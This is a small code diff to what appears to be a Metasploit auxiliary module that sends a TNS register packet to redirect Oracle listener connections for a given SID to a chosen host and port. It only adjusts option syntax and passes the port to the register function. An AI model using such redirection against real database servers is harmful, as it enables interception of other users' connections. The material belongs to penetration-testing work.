@@ -26,7 +26,7 @@ class Metasploit3 < Msf::Auxiliary
 			OptString.new('DHOST', [ true, 	"HOST to redirect to, it should be"\
 								" IP address only"]),
 			OptString.new('DPORT', [ true, 	"PORT to redirect to, it can be 4"\
-								" digits only", "1521"]),
+								" digits only", "1521"])
 			], self.class)
 
 
@@ -42,7 +42,7 @@ class Metasploit3 < Msf::Auxiliary
 			end
 			print_status("Sending register packet with SID %s to redirect to %s:%s\n." % [datastore["SID"],
 				datastore["DHOST"], datastore["DPORT"]])
-			if !send_register(datastore["SID"])
+			if !send_register(datastore["SID"], datastore["DPORT"])
 				print_error("Something wrong with the register packet!\n")
 			end
 			print_status("Wait for 10 seconds.\n")
